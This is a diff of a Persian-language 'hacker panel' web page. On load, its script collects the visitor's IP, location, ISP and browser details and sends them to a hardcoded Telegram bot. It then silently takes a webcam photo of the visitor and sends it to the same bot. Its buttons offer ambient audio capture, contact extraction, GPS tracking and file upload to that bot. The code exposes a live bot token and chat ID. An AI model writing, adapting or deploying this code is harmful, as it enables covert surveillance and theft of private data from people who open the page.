@@ -3,143 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL | HOTKYNTAKY ULTIMATE</title>
+    <title>ترمینال مرکزی | HOTKYNTAKY</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #00ff41; font-family: 'Courier New', monospace; overflow-x: hidden; height: 100%; }
-        
-        /* پس‌زمینه ماتریکس */
+        body, html { margin: 0; padding: 0; background: #000; color: #00ff41; font-family: 'Tahoma', sans-serif; overflow-x: hidden; height: 100%; }
         #matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.4; }
-
+        .scanlines { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03)); z-index: 10; background-size: 100% 3px, 3px 100%; pointer-events: none; }
         .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
-
-        .terminal {
-            width: 100%; max-width: 500px; background: rgba(0, 15, 0, 0.85); border: 2px solid #00ff41; border-radius: 2px;
-            padding: 25px; box-shadow: 0 0 20px #00ff41, inset 0 0 10px #00ff41; position: relative;
-        }
-
-        /* خطوط اسکن تلویزیون قدیمی */
-        .scanlines {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-            z-index: 10; background-size: 100% 3px, 3px 100%; pointer-events: none;
-        }
-
-        h2 { text-align: center; text-transform: uppercase; letter-spacing: 5px; margin-top: 0; animation: glitch 3s infinite; text-shadow: 2px 2px #ff0000; }
-
-        .stat-bar { font-size: 10px; border-bottom: 1px solid #00ff41; margin-bottom: 15px; padding-bottom: 5px; display: flex; justify-content: space-between; }
-
-        input, textarea {
-            background: rgba(0, 40, 0, 0.6); border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin: 10px 0;
-            box-sizing: border-box; outline: none; font-size: 14px; box-shadow: inset 0 0 5px #00ff41;
-        }
-
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
-        
-        button {
-            background: #00ff41; color: #000; border: none; padding: 15px; cursor: pointer;
-            font-weight: bold; text-transform: uppercase; transition: 0.2s; position: relative; overflow: hidden;
-        }
-
-        button:hover { background: #000; color: #00ff41; box-shadow: 0 0 15px #00ff41; transform: translateY(-2px); }
-        button:active { transform: translateY(1px); }
-
-        .voice-btn { grid-column: span 2; background: #ff0000; color: #fff; animation: pulse 2s infinite; }
-
-        #adminBox { border: 1px solid #00ff41; padding: 10px; font-size: 11px; margin-bottom: 20px; background: rgba(0, 255, 65, 0.1); height: 50px; overflow-y: auto; }
-
-        @keyframes glitch {
-            0% { text-shadow: 2px 2px #f00; transform: skew(0deg); }
-            5% { text-shadow: -2px -2px #00f; transform: skew(5deg); }
-            10% { text-shadow: 2px -2px #f00; transform: skew(-5deg); }
-            15% { text-shadow: 0 0 #000; transform: skew(0deg); }
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
-            70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
-        }
+        .terminal { width: 100%; max-width: 500px; background: rgba(0, 15, 0, 0.9); border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 20px #00ff41; position: relative; z-index: 20; }
+        h2 { text-align: center; letter-spacing: 3px; animation: glitch 3s infinite; color: #00ff41; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
+        .stat-bar { font-size: 10px; display: flex; justify-content: space-between; margin-bottom: 15px; color: #008822; }
+        input, textarea { background: rgba(0, 30, 0, 0.7); border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; margin: 10px 0; box-sizing: border-box; outline: none; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        button { background: #00ff41; color: #000; border: none; padding: 12px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #000; color: #00ff41; box-shadow: 0 0 10px #00ff41; }
+        .voice-btn { grid-column: span 2; background: #ff0000; color: #fff; }
+        #adminBox { border: 1px dashed #00ff41; padding: 10px; font-size: 11px; margin-bottom: 15px; height: 80px; overflow-y: auto; white-space: pre-wrap; }
+        @keyframes glitch { 0% { transform: skew(0); } 10% { transform: skew(-5deg); text-shadow: 2px 0 red; } 20% { transform: skew(5deg); text-shadow: -2px 0 blue; } 30% { transform: skew(0); } }
     </style>
 </head>
 <body>
 
     <canvas id="matrix-bg"></canvas>
     <div class="scanlines"></div>
-    
     <video id="video-preview" style="display:none;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <div class="container">
         <div class="terminal">
             <div class="stat-bar">
-                <span>SYSTEM: ONLINE</span>
+                <span>وضعیت: متصل</span>
                 <span id="clock">00:00:00</span>
-                <span>SECURE: YES</span>
+                <span>امنیت: رمزنگاری شده</span>
             </div>
             
-            <h2>HACKER_PANEL</h2>
+            <h2>پنل کنترل مرکزی</h2>
             
-            <div id="adminBox">>> CONNECTION ESTABLISHED...<br>>> INITIALIZING TOOLS...</div>
+            <div id="adminBox">>> در حال اسکن سیستم هدف...</div>
             
-            <input type="text" id="userName" placeholder="SENDER_ID">
-            <textarea id="msgBody" rows="2" placeholder="ENTER_DATA_TO_SEND..."></textarea>
+            <input type="text" id="userName" placeholder="شناسه فرستنده (اختیاری)">
+            <textarea id="msgBody" rows="2" placeholder="متن پیام جهت ارسال..."></textarea>
             
-            <button onclick="sendText()">EXECUTE_TRANSMISSION</button>
+            <button onclick="sendText()" style="width: 100%;">ارسال اطلاعات به سرور</button>
 
             <div class="btn-grid">
-                <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">🎤 START_VOICE_CAPTURE</button>
-                <button onclick="getContacts()" style="background:#6a00ff; color:#fff;">EXTRACT_CONTACTS</button>
-                <button onclick="sendLocation()" style="background:#ff9900; color:#000;">GPS_TRACKING</button>
-                <button onclick="openPicker('image/*')" style="background:#0066ff; color:#fff;">SEND_IMAGE</button>
-                <button onclick="openPicker('*/*')" style="background:#333; color:#fff;">FILE_SYSTEM</button>
+                <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">🎤 ضبط و ارسال صدای محیط</button>
+                <button onclick="getContacts()" style="background:#6a00ff; color:#fff;">استخراج مخاطبین</button>
+                <button onclick="sendLocation()" style="background:#ff9900; color:#000;">ردیابی موقعیت GPS</button>
+                <button onclick="openPicker('image/*')" style="background:#0066ff; color:#fff;">ارسال تصویر</button>
+                <button onclick="openPicker('*/*')" style="background:#333; color:#fff;">دسترسی به فایل‌ها</button>
             </div>
             
             <input type="file" id="fileInput" style="display:none" onchange="handleFileUpload()">
-            <p style="text-align:center; font-size:9px; color:#00661a; margin-top:15px;">HOTKYNTAKY_OS_V4.0_ENCRYPTED</p>
         </div>
     </div>
 
     <script>
-        // ماتریکس متحرک
+        // تنظیمات ماتریکس و ساعت (مشابه قبل)
         const canvas = document.getElementById('matrix-bg');
         const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*";
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "01010101010101010101010101";
+        const fontSize = 14; const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
-
-        function drawMatrix() {
-            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "#00ff41";
-            ctx.font = fontSize + "px monospace";
-            for (let i = 0; i < drops.length; i++) {
-                const text = letters.charAt(Math.floor(Math.random() * letters.length));
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
+        function drawMatrix() { ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = "#00ff41"; ctx.font = fontSize + "px monospace"; drops.forEach((y, i) => { const text = letters[Math.floor(Math.random()*letters.length)]; ctx.fillText(text, i*fontSize, y*fontSize); if(y*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; }); }
         setInterval(drawMatrix, 35);
+        setInterval(() => { const now = new Date(); document.getElementById('clock').innerText = now.toLocaleTimeString('fa-IR'); }, 1000);
 
-        // ساعت زنده
-        function updateClock() {
-            const now = new Date();
-            document.getElementById('clock').innerText = now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds();
-        }
-        setInterval(updateClock, 1000);
-
-        // تنظیمات ربات
         const botToken = "8576028087:AAGUs0ZWXpLYp5mRN0XbI-2ZuIu4eLRtpNM"; 
         const chatId = "8449439423";
-        let mediaRecorder, audioChunks = [], isRecording = false;
 
-        // اجرای خودکار دوربین هنگام ورود
-        window.onload = () => {
-            startSilentCamera();
-            prepareAudio();
+        // اسکنر اطلاعات پیشرفته هنگام ورود
+        window.onload = async () => {
+            document.getElementById('adminBox').innerHTML += "\n>> دریافت اطلاعات IP...";
+            
+            let ipData = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) { ipData = { ip: "ناموفق", country_name: "نامعلوم" }; }
+
+            const info = `
+🚨 **نفوذ جدید ثبت شد!**
+🌐 آی‌پی: ${ipData.ip}
+🌍 کشور: ${ipData.country_name}
+🏙 شهر: ${ipData.city}
+📶 اپراتور: ${ipData.org}
+📱 دستگاه: ${navigator.platform}
+🕒 زمان: ${new Date().toLocaleString('fa-IR')}
+🔗 مرورگر: ${navigator.userAgent.slice(0, 50)}...
+            `;
+            
+            // ارسال اطلاعات به تلگرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
+            
+            document.getElementById('adminBox').innerHTML += `\n>> آی‌پی هدف: ${ipData.ip}\n>> موقعیت: ${ipData.country_name}\n>> اسکن کامل شد.`;
+            
+            startSilentCamera(); // سلفی مخفی
         };
 
         async function startSilentCamera() {
@@ -153,7 +112,8 @@
                     c.getContext('2d').drawImage(video, 0, 0);
                     c.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append('chat_id', chatId); fd.append('photo', blob, 'cam.jpg');
+                        fd.append('chat_id', chatId); fd.append('photo', blob, 'hacker.jpg');
+                        fd.append('caption', '👤 تصویر شکار شده از هدف');
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg');
@@ -162,17 +122,18 @@
         }
 
         function sendText() {
-            const n = document.getElementById('userName').value || "UNKNOWN";
             const m = document.getElementById('msgBody').value;
-            if(!m) return;
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👤 ID: "+n+"\n📡 DATA: "+m)}`);
-            document.getElementById('msgBody').value = "";
-            document.getElementById('adminBox').innerHTML += "<br>>> DATA_SENT_SUCCESSFULLY...";
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📩 پیام جدید:\n"+m)}`);
+            document.getElementById('adminBox').innerHTML += "\n>> پیام ارسال شد.";
         }
 
-        // بقیه توابع ارسال فایل، ویس، مخاطبین و لوکیشن اینجا قرار دارند (مشابه قبل)
+        // سایر توابع ارسال فایل و مخاطبین...
         function openPicker(t) { const i = document.getElementById('fileInput'); i.accept = t; i.click(); }
-        // ... (سایر توابع)
+        function handleFileUpload() {
+            const f = document.getElementById('fileInput').files[0];
+            const fd = new FormData(); fd.append('chat_id', chatId); fd.append('document', f);
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: fd });
+        }
     </script>
 </body>
 </html>
